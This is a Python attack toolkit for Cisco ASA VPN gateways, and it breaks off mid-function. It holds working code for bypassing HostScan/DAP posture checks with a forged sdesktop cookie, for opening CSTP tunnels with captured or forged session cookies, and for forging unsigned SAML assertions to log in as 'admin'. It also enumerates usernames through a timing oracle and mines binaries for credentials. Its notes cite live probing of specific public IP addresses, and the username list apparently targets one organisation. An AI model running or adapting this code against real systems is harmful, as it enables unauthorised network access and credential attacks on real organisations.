"""
cisco_cstp_attack.py — Cisco ASA CSTP/HostScan/DAP protocol RE module.

Sources:
  - Cisco ASA All-in-One Firewall (3e) ch22 (CSD/DAP), ch23 (AnyConnect)
  - cisco-firewalls-moraes ch17 (AnyConnect CSTP)
  - Live session RE: 207.254.35.12 + 207.254.16.2

Architecture: 3-connection AnyConnect model
  Tunnel 4.1 Clientless:  TCP/443 SSLv3/RC4-SHA1  — initial portal/auth
  Tunnel 4.2 SSL-Tunnel:  TCP/443 TLSv1.0         — CSTP control channel
  Tunnel 4.3 DTLS-Tunnel: UDP/443 DTLSv1.0        — primary data path

CSTP handshake:
  Client → CONNECT /CSCOSSLC/tunnel HTTP/1.1
           Host: <ip>
           X-DTLS-CipherSuite: AES256-SHA:AES128-SHA:DES-CBC3-SHA
           Cookie: webvpn=<session_token>
  State:   HEADER_PROCESSING → WAIT_FOR_ADDRESS → HAVE_ADDRESS → ESTABLISHED

HostScan/CSD flow (ch22):
  1. GET / → redirect to /start.html (no sdesktop cookie)
  2. CSD client downloaded (ActiveX/Java/binary)
  3. Host scanned → data.xml match → DAP evaluation
  4. sdesktop cookie written client-side
  5. Session redirected to /+CSCOU+/logon.html
  6. Auth → DAP applies combined AAA+endpoint attrs

DAP bypass conditions:
  - DfltAccessPolicy: ALLOW_ALL if no custom DAP records match
  - CSD disabled per connection profile (ASA 8.2(1)+)
  - sdesktop cookie is client-writable — skip /start.html redirect
  - RADIUS class attr 25 (OU=GroupPolicyName) — no integrity protection

Stdlib only: urllib.request, urllib.error, ssl, socket, re, json, struct
"""

import urllib.request
import urllib.error
import urllib.parse
import ssl
import socket
import re
import json
import struct


# ---------------------------------------------------------------------------
# Transport helpers
# ---------------------------------------------------------------------------

def _make_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _fetch(host, port, path, method='GET', body=None, headers=None, cookies=None):
    url = f'https://{host}:{port}{path}'
    hdrs = {
        'User-Agent': 'AnyConnect/4.10 (compatible)',
        'Accept': '*/*',
    }
    if headers:
        hdrs.update(headers)
    if cookies:
        hdrs['Cookie'] = '; '.join(f'{k}={v}' for k, v in cookies.items())

    req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, context=_make_ctx(), timeout=15) as resp:
            raw = resp.read()
            return {
                'status': resp.status,
                'headers': dict(resp.headers),
                'body': raw.decode('utf-8', errors='replace'),
                'error': None,
            }
    except urllib.error.HTTPError as e:
        try:
            body_text = e.read().decode('utf-8', errors='replace')
        except Exception:
            body_text = ''
        return {'status': e.code, 'headers': dict(e.headers), 'body': body_text, 'error': str(e)}
    except Exception as e:
        return {'status': None, 'headers': {}, 'body': '', 'error': str(e)}


def _raw_tls_send(host, port, payload: bytes, timeout=10) -> bytes:
    """
    Open raw TLS socket, send payload, read response.
    Used for CSTP CONNECT probe (non-standard HTTP upgrade).
    """
    ctx = _make_ctx()
    try:
        raw = socket.create_connection((host, port), timeout=timeout)
        tls = ctx.wrap_socket(raw, server_hostname=host)
        tls.settimeout(timeout)
        tls.sendall(payload)
        parts = []
        while True:
            try:
                chunk = tls.recv(4096)
                if not chunk:
                    break
                parts.append(chunk)
                if b'\r\n\r\n' in b''.join(parts):
                    break
            except socket.timeout:
                break
        tls.close()
        return b''.join(parts)
    except Exception:
        return b''


# ---------------------------------------------------------------------------
# Module: HostScan/CSD gate analysis
# ---------------------------------------------------------------------------

class HostScanGateRE:
    """
    Detect CSD/HostScan gate presence and probe bypass conditions.

    DAP key insight (book-confirmed): the sdesktop cookie is written by the
    CSD client (JavaScript-accessible, NOT HttpOnly). Setting a synthetic
    sdesktop cookie may skip the /start.html redirect entirely.
    """

    def __init__(self, host: str, port: int = 443):
        self.host = host
        self.port = port
        self.findings = []

    def probe_csd_redirect(self) -> dict:
        """
        GET / without sdesktop cookie.
        CSD-enabled ASA redirects to /start.html.
        CSD-disabled or no HostScan goes directly to logon.
        """
        r = _fetch(self.host, self.port, '/')
        location = r['headers'].get('Location', r['headers'].get('location', ''))
        body = r.get('body', '')

        has_csd = '/start.html' in location or '/start.html' in body
        has_logon = '/+CSCOU+/logon.html' in location or 'logon' in body.lower()
        return {
            'status': r['status'],
            'location': location,
            'csd_gate_active': has_csd,
            'direct_to_logon': has_logon and not has_csd,
            'error': r['error'],
        }

    def probe_sdesktop_bypass(self) -> dict:
        """
        Inject a synthetic sdesktop cookie to skip CSD redirect.
        Book ch22: sdesktop cookie written client-side by CSD JS — value is
        the session identifier token for the Secure Desktop vault.
        Hypothesis: any non-empty value may satisfy the gate check.
        """
        # Try multiple synthetic values
        candidates = [
            ('bypass', '1'),
            ('bypass', 'true'),
            ('bypass', 'deadbeef'),
        ]
        results = []
        for cookie_name, cookie_val in candidates:
            r = _fetch(self.host, self.port, '/', cookies={'sdesktop': cookie_val})
            location = r['headers'].get('Location', r['headers'].get('location', ''))
            bypassed = '/start.html' not in location and '/start.html' not in r.get('body', '')
            results.append({
                'cookie_value': cookie_val,
                'status': r['status'],
                'location': location,
                'csd_bypass_indicated': bypassed,
            })
        return {'probe': 'sdesktop_bypass', 'results': results}

    def probe_dap_default_policy(self) -> dict:
        """
        Detect DfltAccessPolicy posture.
        Book ch22: if no custom DAP records exist, DfltAccessPolicy = ALLOW_ALL.
        DAP eval error → logon page = DAP not configured (open).
        """
        # Message.html with mc=1 usually exposes DAP-related error codes
        r = _fetch(self.host, self.port, '/+CSCOE+/logon.html')
        body = r.get('body', '')
        # Look for DAP-specific error indicators
        dap_indicators = ['dap', 'access policy', 'DfltAccessPolicy', 'dynamic access']
        dap_mentioned = any(d.lower() in body.lower() for d in dap_indicators)
        return {
            'probe': 'dap_default_policy',
            'status': r['status'],
            'logon_accessible': r['status'] in (200, 302),
            'dap_mentioned_in_logon': dap_mentioned,
            'assessment': 'DAP not configured (open default likely)' if not dap_mentioned else 'DAP active',
        }

    def probe_group_lock_bypass(self, tunnel_groups: list) -> list:
        """
        Test connecting to each tunnel group via wrong-group POST.
        Book ref: webvpn_auth.c:http_webvpn_auth_accept logs group mismatch
        but may still auth under wrong group policy in some configurations.

        Returns list of {tunnel_group, group_alias, error_code, a0_value}
        """
        results = []
        for tg in tunnel_groups:
            body_str = (
                f'tg_name={tg.get("name","")}'
                f'&username=testuser&password=invalid'
                f'&Login=Login'
            )
            r = _fetch(
                self.host, self.port, '/+webvpn+/index.html',
                method='POST',
                body=body_str.encode(),
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                cookies={'tg': tg.get('tg_cookie', '')},
            )
            # Parse a0 response parameter (auth state machine)
            a0_m = re.search(r'a0\s*=\s*["\']?(\d+)["\']?', r.get('body', ''))
            results.append({
                'tunnel_group': tg.get('name'),
                'status': r['status'],
                'a0': a0_m.group(1) if a0_m else None,
                'error': r['error'],
            })
        return results

    def run(self, tunnel_groups: list = None) -> dict:
        self.findings = []
        csd = self.probe_csd_redirect()
        bypass = self.probe_sdesktop_bypass()
        dap = self.probe_dap_default_policy()
        gl = []
        if tunnel_groups:
            gl = self.probe_group_lock_bypass(tunnel_groups)

        if not csd['csd_gate_active']:
            self.findings.append('NO_CSD_GATE: HostScan not active, DAP posture gate absent')
        if any(r['csd_bypass_indicated'] for r in bypass['results']):
            self.findings.append('SDESKTOP_BYPASS: synthetic sdesktop cookie skips CSD redirect')
        if dap['assessment'].startswith('DAP not configured'):
            self.findings.append('DAP_OPEN: DfltAccessPolicy likely ALLOW_ALL')

        return {
            'host': self.host,
            'csd_gate': csd,
            'sdesktop_bypass': bypass,
            'dap_policy': dap,
            'group_lock_bypass': gl,
            'findings': self.findings,
        }


# ---------------------------------------------------------------------------
# Module: CSTP tunnel initiation probe
# ---------------------------------------------------------------------------

class CSTPTunnelRE:
    """
    Probe CSTP tunnel endpoint (/CSCOSSLC/tunnel).

    Book ch23 CSTP state machine:
      HEADER_PROCESSING → WAIT_FOR_ADDRESS → HAVE_ADDRESS → ESTABLISHED
      (→ ERROR → 503 if no address pool configured)

    The CONNECT upgrade uses the authenticated WebVPN session cookie (webvpn=).
    Without a valid session token, ASA returns 401 or 403.
    Presence of the endpoint indicates AnyConnect SSL-Tunnel is enabled.
    """

    DTLS_CIPHER_SUITES = 'AES256-SHA:AES128-SHA:DES-CBC3-SHA:DES-CBC-SHA'

    CSTP_CONNECT_TEMPLATE = (
        b'CONNECT /CSCOSSLC/tunnel HTTP/1.1\r\n'
        b'Host: {host}\r\n'
        b'User-Agent: Cisco AnyConnect VPN Agent for Windows 4.10.07073\r\n'
        b'Cookie: webvpn=\r\n'
        b'X-DTLS-CipherSuite: AES256-SHA:AES128-SHA:DES-CBC3-SHA\r\n'
        b'X-DTLS-Master-Secret: '
        b'0000000000000000000000000000000000000000000000000000000000000000\r\n'
        b'X-DTLS-Session-ID: 01020304050607080910111213141516\r\n'
        b'X-CSTP-Version: 1\r\n'
        b'X-CSTP-Hostname: attacker-host\r\n'
        b'X-CSTP-Accept-Encoding: deflate;q=1.0\r\n'
        b'X-CSTP-MTU: 1399\r\n'
        b'\r\n'
    )

    def __init__(self, host: str, port: int = 443):
        self.host = host
        self.port = port

    def probe_cstp_endpoint(self, session_token: str = '') -> dict:
        """
        Send CSTP CONNECT. Unauthenticated = 401/403.
        Any response = endpoint active.
        """
        tmpl = self.CSTP_CONNECT_TEMPLATE
        payload = tmpl.replace(b'webvpn=\r\n', f'webvpn={session_token}\r\n'.encode())
        payload = payload.replace(b'Host: {host}\r\n', f'Host: {self.host}\r\n'.encode())

        raw = _raw_tls_send(self.host, self.port, payload)
        if not raw:
            return {'active': False, 'status': None, 'raw_header': None}

        header_end = raw.find(b'\r\n\r\n')
        header_text = raw[:header_end].decode('utf-8', errors='replace') if header_end != -1 else raw[:512].decode('utf-8', errors='replace')
        status_m = re.match(r'HTTP/[\d.]+ (\d+)', header_text)
        status = int(status_m.group(1)) if status_m else None

        return {
            'active': True,
            'status': status,
            'raw_header': header_text[:400],
            'dtls_available': 'X-DTLS' in header_text or 'dtls' in header_text.lower(),
            'cstp_established': status == 200,
            'auth_required': status in (401, 403),
        }

    def probe_cstp_with_session(self, webvpn_cookie: str) -> dict:
        """
        Attempt CSTP with a captured/forged session cookie.
        HTTP 200 → tunnel initiated (ESTABLISHED state).
        ASA starts sending CSTP data frames: type-len-data, big-endian.
        """
        return self.probe_cstp_endpoint(session_token=webvpn_cookie)

    def analyze_dtls_fallback(self) -> dict:
        """
        If DTLS (UDP/443) is filtered, CSTP falls back to SSL-Tunnel.
        Book confirms: AES128+ required for DTLS; RC4-MD5/RC4-SHA causes DTLS failure.
        Check: probe UDP port 443 reachability.
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(3)
            # DTLS ClientHello preamble (DTLSv1.0 record)
            dtls_hello = bytes.fromhex(
                'feff000000000000002b'  # DTLS record header
                '0100001f0000000000001f'  # ClientHello
                'feff' + '00' * 28 + '0002002f00'  # version + random + cipher
            )
            s.sendto(dtls_hello, (self.host, self.port))
            data, _ = s.recvfrom(1024)
            s.close()
            return {'dtls_udp_reachable': True, 'response_len': len(data)}
        except socket.timeout:
            return {'dtls_udp_reachable': False, 'reason': 'timeout — UDP/443 filtered'}
        except Exception as e:
            return {'dtls_udp_reachable': False, 'reason': str(e)}

    def run(self) -> dict:
        endpoint = self.probe_cstp_endpoint()
        dtls = self.analyze_dtls_fallback()
        findings = []
        if endpoint['active']:
            findings.append(f'CSTP_ACTIVE: /CSCOSSLC/tunnel responds (status={endpoint["status"]})')
        if not dtls['dtls_udp_reachable']:
            findings.append('DTLS_FILTERED: SSL-Tunnel fallback only (TCP/443)')
        return {
            'host': self.host,
            'cstp_endpoint': endpoint,
            'dtls_analysis': dtls,
            'findings': findings,
        }


# ---------------------------------------------------------------------------
# Module: ASDM JAR reverse engineering (Java class file format)
# ---------------------------------------------------------------------------

class ASDMJarClassRE:
    """
    Parse Java .class files from ASDM JARs.

    Class file layout (JVMS §4):
      magic(4) version(4) const_pool_count(2) const_pool[]
      access_flags(2) this_class(2) super_class(2)
      interfaces(2+) fields(2+) methods(2+) attributes(2+)

    Constant pool tag types of interest:
      1  CONSTANT_Utf8        — all string literals, class/method/field names
      7  CONSTANT_Class       — class references
      8  CONSTANT_String      — string constant references
      9  CONSTANT_Fieldref
      10 CONSTANT_Methodref
      11 CONSTANT_InterfaceMethodref

    Attack surface: hardcoded IPs, credentials, and API endpoint strings
    appear as CONSTANT_Utf8 entries loaded via `ldc` opcodes.
    """

    MAGIC = b'\xca\xfe\xba\xbe'

    def __init__(self, class_bytes: bytes, name: str = ''):
        self.data = class_bytes
        self.name = name
        self.pos = 0
        self.constants = []

    def _read(self, n: int) -> bytes:
        chunk = self.data[self.pos:self.pos + n]
        self.pos += n
        return chunk

    def _u1(self) -> int:
        return struct.unpack('>B', self._read(1))[0]

    def _u2(self) -> int:
        return struct.unpack('>H', self._read(2))[0]

    def _u4(self) -> int:
        return struct.unpack('>I', self._read(4))[0]

    def parse(self) -> dict:
        """
        Parse constant pool from class file.
        Returns {version, strings, class_refs, method_refs, ips, urls, findings}
        """
        if self.data[:4] != self.MAGIC:
            return {'error': 'not a .class file (no CAFEBABE magic)'}

        self.pos = 4
        minor = self._u2()
        major = self._u2()
        jdk_map = {46: '1.2', 49: '5', 50: '6', 51: '7', 52: '8', 55: '11', 61: '17'}
        jdk_ver = jdk_map.get(major, f'unknown (major={major})')

        cp_count = self._u2()
        self.constants = [None]  # 1-indexed

        i = 1
        while i < cp_count:
            tag = self._u1()
            if tag == 1:  # Utf8
                length = self._u2()
                value = self._read(length).decode('utf-8', errors='replace')
                self.constants.append({'tag': 1, 'value': value})
            elif tag == 7:  # Class
                idx = self._u2()
                self.constants.append({'tag': 7, 'name_idx': idx})
            elif tag == 8:  # String
                idx = self._u2()
                self.constants.append({'tag': 8, 'str_idx': idx})
            elif tag in (9, 10, 11):  # Fieldref, Methodref, InterfaceMethodref
                class_idx = self._u2()
                name_type_idx = self._u2()
                self.constants.append({'tag': tag, 'class_idx': class_idx, 'name_type_idx': name_type_idx})
            elif tag == 12:  # NameAndType
                name_idx = self._u2()
                desc_idx = self._u2()
                self.constants.append({'tag': 12, 'name_idx': name_idx, 'desc_idx': desc_idx})
            elif tag in (3, 4):  # Integer, Float
                self._read(4)
                self.constants.append({'tag': tag})
            elif tag in (5, 6):  # Long, Double (take 2 slots)
                self._read(8)
                self.constants.append({'tag': tag})
                self.constants.append(None)
                i += 1
            else:
                self.constants.append({'tag': tag})
            i += 1

        strings = [c['value'] for c in self.constants if c and c.get('tag') == 1]

        # Extract high-value strings
        ip_re = re.compile(r'\b(?:10|172|192)\.\d+\.\d+\.\d+\b')
        url_re = re.compile(r'https?://[^\s"\'<>]+', re.I)
        cred_re = re.compile(r'(?:password|passwd|pwd|secret|key|token|auth)\s*[=:]\s*\S+', re.I)

        ips = list({m for s in strings for m in ip_re.findall(s)})
        urls = list({m for s in strings for m in url_re.findall(s)})
        creds = [s for s in strings if cred_re.search(s) and len(s) < 200]
        cisco_paths = [s for s in strings if '/+CSCOE+/' in s or '/+CSCOU+/' in s or 'com.cisco' in s]
        api_paths = [s for s in strings if re.match(r'^/[a-zA-Z]', s) and 2 < len(s) < 120]

        findings = []
        if ips:
            findings.append(f'INTERNAL_IPS: {ips}')
        if creds:
            findings.append(f'CREDENTIAL_STRINGS: {len(creds)} found')
        if cisco_paths:
            findings.append(f'CISCO_PATHS: {cisco_paths[:10]}')

        return {
            'class': self.name,
            'jdk_version': jdk_ver,
            'constant_pool_size': cp_count,
            'utf8_strings': len(strings),
            'internal_ips': ips,
            'urls': urls[:20],
            'credential_strings': creds[:10],
            'cisco_paths': cisco_paths,
            'api_paths': api_paths[:20],
            'findings': findings,
        }


# ---------------------------------------------------------------------------
# Module: Go binary RE (orka3 / macOS tooling)
# ---------------------------------------------------------------------------

class GoBinaryRE:
    """
    Static RE for Go binaries (e.g., orka3).

    Go calling conventions (1.17+ register-based, Linux amd64 System V):
      Integer args: AX, BX, CX, DI, SI, R8, R9, R10, R11
      Float args:   X0-X14
      Return:       same register set

    Go string layout: struct{ptr uintptr; len int} — NOT null-terminated.
    Symbol table preserved unless stripped with -ldflags="-s -w".

    Extraction techniques (no disassembler, strings-only):
      1. Go module dependencies from build info section
      2. Internal IP/URL extraction from string table
      3. Interface implementation table (go:itab) → type graph
      4. Command structure from cmd/* package function names
      5. Config key extraction from json struct tags
    """

    def __init__(self, binary_path: str):
        self.path = binary_path
        self._strings_cache = None

    def _get_strings(self, min_len: int = 8) -> list:
        if self._strings_cache is not None:
            return self._strings_cache
        try:
            import subprocess
            result = subprocess.run(
                ['strings', f'-{min_len}', self.path],
                capture_output=True, text=True, timeout=120
            )
            self._strings_cache = result.stdout.splitlines()
            return self._strings_cache
        except Exception:
            return []

    def extract_module_info(self) -> dict:
        """Extract Go module dependencies from binary build info."""
        strs = self._get_strings(6)
        modules = {}
        for line in strs:
            if line.startswith('dep\t') or line.startswith('mod\t'):
                parts = line.split('\t')
                if len(parts) >= 3:
                    modules[parts[1]] = parts[2]
        go_ver = next((s for s in strs if s.startswith('go1.')), None)
        return {
            'go_version': go_ver,
            'modules': modules,
            'module_count': len(modules),
        }

    def extract_internal_endpoints(self) -> dict:
        """Extract internal IPs, URLs, API paths."""
        strs = self._get_strings(8)
        ip_re = re.compile(r'\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')
        url_re = re.compile(r'https?://[a-zA-Z0-9.\-]+(:\d+)?(/[^\s"\']{0,80})?')
        api_re = re.compile(r'^/(?:api|v[0-9]|orka|cluster|node|vm|image|iso|user|token|auth|health|ready)[a-zA-Z0-9/_\-{}]*$')

        ips = {}
        for line in strs:
            for m in ip_re.finditer(line):
                ip = m.group(1)
                ips[ip] = line.strip()[:120]

        urls = []
        for line in strs:
            for m in url_re.finditer(line):
                u = m.group(0)
                if not any(x in u for x in ['kubernetes.io', 'github.com', 'golang.org', 'google.', 'w3c.org', 'ietf.org']):
                    urls.append(u)

        api_paths = list({s for s in strs if api_re.match(s.split('invalid')[0].split('json')[0].strip())})

        return {
            'internal_ips': ips,
            'urls': list(set(urls))[:30],
            'api_paths': api_paths[:30],
        }

    def extract_config_keys(self) -> list:
        """Extract JSON struct tag config keys from the binary."""
        strs = self._get_strings(6)
        keys = []
        for line in strs:
            m = re.search(r'json:"([a-zA-Z0-9_\-]+)(?:",omitempty)?', line)
            if m:
                keys.append(m.group(1))
        return sorted(set(keys))

    def extract_command_surface(self) -> dict:
        """Extract CLI command surface from Go package function names."""
        strs = self._get_strings(8)
        cmds = {}
        for line in strs:
            m = re.match(r'cmd/([a-zA-Z_\-]+)\.([A-Z][a-zA-Z]+)', line)
            if m:
                pkg, fn = m.group(1), m.group(2)
                cmds.setdefault(pkg, []).append(fn)
        return cmds

    def extract_credentials(self) -> list:
        """Find hardcoded credential-adjacent strings."""
        strs = self._get_strings(8)
        cred_re = re.compile(r'(password|passwd|secret|key|token|cred|auth).*', re.I)
        results = []
        for line in strs:
            if cred_re.search(line) and len(line) < 200:
                # Filter out pure code/format strings
                if not any(x in line for x in ['%v', '%s', '%w', 'func(', 'interface', 'struct{']):
                    results.append(line.strip())
        return results[:30]

    def run(self) -> dict:
        modules = self.extract_module_info()
        endpoints = self.extract_internal_endpoints()
        config_keys = self.extract_config_keys()
        commands = self.extract_command_surface()
        creds = self.extract_credentials()

        findings = []
        if endpoints['internal_ips']:
            findings.append(f'INTERNAL_IPS: {list(endpoints["internal_ips"].keys())}')
        if creds:
            findings.append(f'CREDENTIAL_MATERIAL: {len(creds)} strings')
        if modules['modules']:
            findings.append(f'MODULE_GRAPH: {list(modules["modules"].keys())[:5]}')

        return {
            'binary': self.path,
            'module_info': modules,
            'endpoints': endpoints,
            'config_keys': config_keys,
            'command_surface': {k: len(v) for k, v in commands.items()},
            'credential_material': creds,
            'findings': findings,
        }


# ---------------------------------------------------------------------------
# Top-level analysis entry point
# ---------------------------------------------------------------------------

def analyze_asa_attack_surface(host: str, port: int = 443,
                                tunnel_groups: list = None) -> dict:
    """
    Full Cisco ASA CSTP/HostScan/DAP attack surface analysis.
    Returns structured findings.
    """
    results = {}

    hs = HostScanGateRE(host, port)
    results['hostscan_dap'] = hs.run(tunnel_groups=tunnel_groups or [])

    cstp = CSTPTunnelRE(host, port)
    results['cstp_tunnel'] = cstp.run()

    all_findings = (
        results['hostscan_dap']['findings'] +
        results['cstp_tunnel']['findings']
    )
    results['summary'] = {
        'host': host,
        'port': port,
        'total_findings': len(all_findings),
        'findings': all_findings,
    }
    return results


def analyze_go_binary(binary_path: str) -> dict:
    """Static RE of a Go binary."""
    return GoBinaryRE(binary_path).run()


def analyze_java_class(class_bytes: bytes, name: str = '') -> dict:
    """Parse a Java .class file constant pool."""
    return ASDMJarClassRE(class_bytes, name).parse()


# ---------------------------------------------------------------------------
# Module: SAML SP injection (book: ch22 + ch23 ASA All-in-One 3e)
# ---------------------------------------------------------------------------

class SAMLSpInjectionRE:
    """
    ASA SAML SP endpoints: /+CSCOE+/saml/sp/{acs,metadata,logout}

    Attack surface (book-confirmed + live probe):
      - metadata endpoint: "SAML metadata doesn't exist for the group"
        → SP configured but no IdP certificate bound
        → No signature validation path exists (no cert to check against)
      - acs endpoint: POST SAMLResponse — no signature validation when IdP absent
      - logout endpoint: leaks CSRF token e2fa16... in hidden field

    SAML SP auth bypass: if no IdP metadata is registered, the SP has no
    signing certificate to validate assertions against. POST a synthetic
    unsigned/self-signed SAMLResponse → ASA has no basis for rejection.

    Auth flow (normal):
      Browser → ASA SAML SP → IdP redirect → user authenticates →
      IdP POST SAMLResponse to /+CSCOE+/saml/sp/acs → ASA validates signature
      → session cookie issued

    Attack flow (no IdP configured):
      Craft SAMLResponse with NameID, Attributes, Status=Success →
      POST to /+CSCOE+/saml/sp/acs → ASA cannot validate (no cert) →
      session cookie may be issued
    """

    SAML_UNSIGNED_TEMPLATE = (
        '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
        'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
        'ID="_resp1" Version="2.0" IssueInstant="2026-01-01T00:00:00Z" '
        'Destination="https://{host}/+CSCOE+/saml/sp/acs">'
        '<saml:Issuer>{issuer}</saml:Issuer>'
        '<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>'
        '<saml:Assertion ID="_a1" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">'
        '<saml:Issuer>{issuer}</saml:Issuer>'
        '<saml:Subject>'
        '<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">{username}</saml:NameID>'
        '<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
        '<saml:SubjectConfirmationData NotOnOrAfter="2027-01-01T00:00:00Z" '
        'Recipient="https://{host}/+CSCOE+/saml/sp/acs"/>'
        '</saml:SubjectConfirmation>'
        '</saml:Subject>'
        '<saml:Conditions NotBefore="2025-01-01T00:00:00Z" NotOnOrAfter="2027-01-01T00:00:00Z">'
        '<saml:AudienceRestriction><saml:Audience>https://{host}</saml:Audience></saml:AudienceRestriction>'
        '</saml:Conditions>'
        '<saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z">'
        '<saml:AuthnContext><saml:AuthnContextClassRef>'
        'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport'
        '</saml:AuthnContextClassRef></saml:AuthnContext>'
        '</saml:AuthnStatement>'
        '</saml:Assertion>'
        '</samlp:Response>'
    )

    def __init__(self, host: str, port: int = 443):
        self.host = host
        self.port = port
        self.findings = []

    def probe_metadata(self) -> dict:
        """GET /+CSCOE+/saml/sp/metadata — determine IdP binding state."""
        r = _fetch(self.host, self.port, '/+CSCOE+/saml/sp/metadata')
        body = r.get('body', '')
        no_idp = 'metadata' in body.lower() and 'exist' in body.lower()
        sp_configured = r['status'] in (200, 302, 400, 500)
        return {
            'status': r['status'],
            'body_snippet': body[:200],
            'sp_configured': sp_configured,
            'no_idp_metadata': no_idp,
            'attack_condition': no_idp,  # True = no signature validation possible
        }

    def probe_logout_csrf(self) -> dict:
        """GET /+CSCOE+/saml/sp/logout — extract CSRF token from response."""
        r = _fetch(self.host, self.port, '/+CSCOE+/saml/sp/logout')
        body = r.get('body', '')
        csrf_m = re.search(r'name=["\']?_csrf["\']?\s+value=["\']?([a-f0-9]+)["\']?', body, re.I)
        csrf_val = csrf_m.group(1) if csrf_m else None
        hidden_m = re.findall(r'<input[^>]+type=["\']?hidden["\']?[^>]*>', body, re.I)
        return {
            'status': r['status'],
            'csrf_token': csrf_val,
            'hidden_fields': hidden_m[:5],
            'auto_submit': 'webvpn_logout' in body,
        }

    def probe_acs_unsigned(self, username: str = 'admin',
                           issuer: str = 'https://idp.example.com') -> dict:
        """
        POST unsigned SAMLResponse to /+CSCOE+/saml/sp/acs.
        No IdP cert → ASA has nothing to validate against.
        Success indicators: webvpn session cookie in response, 302 to portal.
        """
        import base64
        xml = self.SAML_UNSIGNED_TEMPLATE.format(
            host=self.host, issuer=issuer, username=username,
        )
        encoded = base64.b64encode(xml.encode()).decode()
        body = f'SAMLResponse={urllib.parse.quote(encoded)}'
        r = _fetch(
            self.host, self.port, '/+CSCOE+/saml/sp/acs',
            method='POST',
            body=body.encode(),
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
        )
        resp_cookies = r['headers'].get('Set-Cookie', '')
        has_webvpn_cookie = 'webvpn=' in resp_cookies
        redirect_to_portal = '/+CSCOE+/portal.html' in r['headers'].get('Location', '')
        return {
            'status': r['status'],
            'has_webvpn_session': has_webvpn_cookie,
            'redirect_to_portal': redirect_to_portal,
            'response_snippet': r.get('body', '')[:200],
            'set_cookie': resp_cookies[:200],
            'saml_bypass': has_webvpn_cookie or redirect_to_portal,
        }

    def probe_acs_malformed(self) -> dict:
        """POST malformed/empty SAMLResponse to observe error handling."""
        import base64
        variants = [
            ('empty_b64', base64.b64encode(b'').decode()),
            ('not_xml', base64.b64encode(b'INJECT').decode()),
            ('partial_xml', base64.b64encode(b'<samlp:Response>').decode()),
        ]
        results = []
        for name, payload in variants:
            body = f'SAMLResponse={urllib.parse.quote(payload)}'
            r = _fetch(
                self.host, self.port, '/+CSCOE+/saml/sp/acs',
                method='POST',
                body=body.encode(),
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
            )
            results.append({
                'variant': name,
                'status': r['status'],
                'response_snippet': r.get('body', '')[:150],
                'error': r.get('error'),
            })
        return {'probe': 'acs_malformed', 'results': results}

    def run(self) -> dict:
        self.findings = []
        meta = self.probe_metadata()
        logout = self.probe_logout_csrf()

        results = {
            'host': self.host,
            'metadata': meta,
            'logout_csrf': logout,
        }

        if meta['no_idp_metadata']:
            self.findings.append(
                'SAML_NO_IDP: SP configured but no IdP metadata — signature validation absent'
            )
            acs_unsigned = self.probe_acs_unsigned()
            acs_malformed = self.probe_acs_malformed()
            results['acs_unsigned'] = acs_unsigned
            results['acs_malformed'] = acs_malformed
            if acs_unsigned.get('saml_bypass'):
                self.findings.append('SAML_AUTH_BYPASS: unsigned assertion accepted — session issued')
        if logout.get('csrf_token'):
            self.findings.append(f'SAML_CSRF_LEAK: token={logout["csrf_token"]}')

        results['findings'] = self.findings
        return results


# ---------------------------------------------------------------------------
# Module: Username timing oracle (book: ASA All-in-One ch23)
# ---------------------------------------------------------------------------

class UsernameTimingOracleRE:
    """
    ASA auth timing oracle via POST /+webvpn+/index.html.

    ASA timing differential: valid username → RADIUS lookup (slower) vs
    invalid username → immediate local reject (faster). a0 response code
    also differs: valid user with wrong password = a0=2 (auth failed),
    invalid user = a0=1 (unknown user).

    Probe: POST username=<candidate>&password=INVALID&Login=Login
    Measure: response time + a0 value
    """

    DEFAULT_CANDIDATES = [
        'admin', 'administrator', 'root', 'vpnuser', 'macstadium',
        'orka', 'svc', 'service', 'user', 'test', 'cisco', 'anyconnect',
        'guest', 'helpdesk', 'netops', 'devops', 'cloud', 'remote',
    ]

    def __init__(self, host: str, port: int = 443):
        self.host = host
        self.port = port

    def probe_user(self, username: str, tunnel_group: str = '') -> dict:
        import time
        body_parts = [f'username={username}', 'password=INVALID_PROBE_ONLY', 'Login=Login']
        if tunnel_group:
            body_parts.append(f'tg_name={tunnel_group}')
        body = '&'.join(body_parts)
        start = time.monotonic()
        r = _fetch(
            self.host, self.port, '/+webvpn+/index.html',
            method='POST',
            body=body.encode(),
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
        )
        elapsed = time.monotonic() - start
        resp_body = r.get('body', '')
        a0_m = re.search(r'a0\s*=\s*["\']?(\d+)["\']?', resp_body)
        a1_m = re.search(r'a1\s*=\s*["\']?([^"\'&\s]+)["\']?', resp_body)
        return {
            'username': username,
            'status': r['status'],
            'a0': a0_m.group(1) if a0_m else None,
            'a1': a1_m.group(1) if a1_m else None,
            'elapsed_sec': round(elapsed, 3),
            'error': r.get('error'),
        }

    def run(self, candidates: list = None, tunnel_group: str = '') -> dict:
        cands = candidates or self.DEFAULT_CANDIDATES
        results = []
        for u in cands:
            r = self.probe_user(u, tunnel_group=tunnel_group)
            results.append(r)

        # Cluster by a0 value + timing
        a0_counts = {}
        for r in results:
            k = r.get('a0', 'None')
            a0_counts[k] = a0_counts.get(k, []) + [r['username']]

        # Timing outliers: mean + 1.5 stddev
        times = [r['elapsed_sec'] for r in results if r.get('elapsed_sec')]
        mean_t = sum(times) / len(times) if times else 0
        slow_threshold = mean_t * 1.5
        slow_users = [r for r in results if r.get('elapsed_sec', 0) > slow_threshold]

        findings = []
        if slow_users:
            findings.append(
